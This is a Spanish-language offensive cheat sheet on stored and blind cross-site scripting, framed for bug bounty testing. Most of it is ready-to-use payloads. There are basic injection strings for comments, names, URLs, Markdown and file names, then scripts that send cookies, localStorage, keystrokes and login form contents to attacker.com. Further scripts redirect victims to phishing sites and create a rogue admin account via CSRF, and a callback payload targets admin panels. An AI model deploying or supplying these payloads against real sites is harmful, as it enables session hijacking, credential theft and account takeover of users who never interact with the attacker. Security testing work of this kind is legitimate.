# Stored XSS

El payload se almacena de forma permanente en el servidor (base de datos, archivo, log) y se ejecuta cada vez que cualquier usuario cargue la página que muestra ese contenido. Es el tipo de XSS con mayor impacto porque no requiere que la víctima haga clic en ningún enlace.

```
Atacante envía payload → Servidor lo almacena en BD
→ Víctima carga la página → Servidor sirve el payload almacenado
→ Script ejecutado en el navegador de la víctima
```

### Puntos de inyección más comunes

* Comentarios de publicaciones / foros
* Campos de perfil (nombre, bio, avatar URL)
* Mensajes de chat / DMs
* Títulos de productos / reviews
* Tickets de soporte
* Nombres de archivos subidos
* Campos de configuración de la cuenta
* Mensajes de error almacenados en logs visibles

### Payloads básicos

```html
<!-- Clásico en formulario de comentario -->
<script>alert(1)</script>

<!-- Si script está bloqueado -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- En campo de nombre (puede ser corto, usar payload compacto) -->
<img/src=x onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Auto-ejecutable sin interacción -->
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
```

### Payloads por contexto de almacenamiento

#### En campo de texto / textarea

```html
<script>alert(document.domain)</script>
<img src=x onerror="alert(document.domain)">
```

#### En campo de nombre (pocos caracteres)

```html
<svg/onload=alert(1)>
<img/src=x onerror=alert`1`>
xss"><svg/onload=alert(1)>
```

#### En campo de URL (avatar, website, etc.)

```javascript
javascript:alert(1)
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
```

#### En campo que permite HTML/Markdown

```html
<!-- Si hay un editor WYSIWYG o Markdown con HTML permitido -->
<a href="javascript:alert(1)">click me</a>
[click me](javascript:alert(1))
![x](x onerror=alert(1))

<!-- Inyección en atributos permitidos -->
<img src="x" onerror="alert(1)">
<div onmouseover="alert(1)">hover me</div>
```

#### En nombre de archivo subido

```
Nombre del archivo: <img src=x onerror=alert(1)>.jpg
Si el nombre se refleja en el HTML: inyección ejecutada al listar archivos
```

### Escalada de impacto - PoC&#x20;

#### Robo de cookie de sesión (session hijacking)

```javascript
// Payload almacenado en comentario / perfil
<script>
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// Versión compacta
<script>new Image().src='https://attacker.com/?c='+document.cookie</script>

// Con cabeceras para más datos
<script>
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: window.location.href,
    dom: document.documentElement.innerHTML
  })
});
</script>
```

#### Robo de localStorage / sessionStorage

```javascript
<script>
var data = {
  local: JSON.stringify(localStorage),
  session: JSON.stringify(sessionStorage),
  cookie: document.cookie
};
fetch('https://attacker.com/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>
```

#### Keylogger

```javascript
<script>
document.addEventListener('keydown', function(e) {
  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
</script>
```

#### Captura de formulario de login

```javascript
<script>
document.querySelector('form').addEventListener('submit', function(e) {
  var data = new FormData(e.target);
  fetch('https://attacker.com/form', {
    method: 'POST',
    body: JSON.stringify(Object.fromEntries(data))
  });
});
</script>
```

#### Redirigir a página de phishing

```javascript
<script>window.location='https://attacker-phishing-site.com'</script>
// Con delay para que parezca más legítimo
<script>setTimeout(function(){window.location='https://evil.com'},3000)</script>
```

#### Crear usuario admin (CSRF via XSS)

```javascript
<script>
// Obtener token CSRF primero
fetch('/admin/settings')
  .then(r => r.text())
  .then(html => {
    var csrf = html.match(/csrf_token" value="([^"]+)"/)[1];
    return fetch('/admin/users/create', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf_token=' + csrf + '&username=hacker&password=hacked123&role=admin'
    });
  });
</script>
```

### Blind XSS

El payload se almacena y se ejecuta en un contexto que el atacante no puede ver directamente, como un **panel de administración** que revisa logs, tickets, o formularios.

#### Payload con callback

```javascript
// El atacante monta un servidor que registra cuándo se ejecuta el payload
<script>new Image().src='https://attacker.com/blind?url='+encodeURIComponent(window.location.href)+'&cookie='+encodeURIComponent(document.cookie)</script>

// Payload más informativo
<script>
fetch('https://attacker.com/blind', {
  method: 'POST',
  body: JSON.stringify({
    url: window.location.href,
    title: document.title,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    userAgent: navigator.userAgent
  })
});
</script>
```

#### Herramientas para Blind XSS

```
XSS Hunter (https://xsshunter.com)
→ Proporciona payloads únicos con callbacks automáticos
→ Captura URL, cookies, DOM, screenshot

Interactsh (https://interactsh.com)
→ Registra callbacks HTTP/DNS

Servidor propio con netcat:
nc -lvnp 80
→ Escuchar conexiones entrantes
```

#### Lugares donde inyectar Blind XSS

```
- Campos de soporte / tickets de ayuda
- Formularios de contacto
- Campos de facturación / dirección
- Nombre completo en checkout
- User-Agent en logs de acceso
- Feedback / encuestas
- Importación de CSV con campos que se muestran en panel admin
```

### Metodología

```
1. Identificar puntos donde los datos se almacenan y muestran
   → Comentarios, perfil, mensajes, archivos, etc.

2. Inyectar payload básico
   → <script>alert(1)</script>

3. Navegar a la página donde se renderiza el dato almacenado
   → ¿Se ejecuta el alert?

4. Si no hay feedback visible (blind XSS)
   → Usar payload con callback a servidor controlado

5. Escalar impacto
   → Session hijacking, keylogger, CSRF, phishing
```

> Stored XSS en un panel de administración suele clasificarse como **crítico** en bug bounty ya que puede comprometer cuentas privilegiadas.

> XSS Hunter facilita enormemente el blind XSS porque gestiona los callbacks automáticamente y toma capturas de pantalla del panel admin donde se ejecuta el payload.

> En stored XSS siempre confirmar la persistencia: cerrar sesión, abrir el navegador en modo incógnito y volver a la página para verificar que el payload se ejecuta sin interacción del atacante.
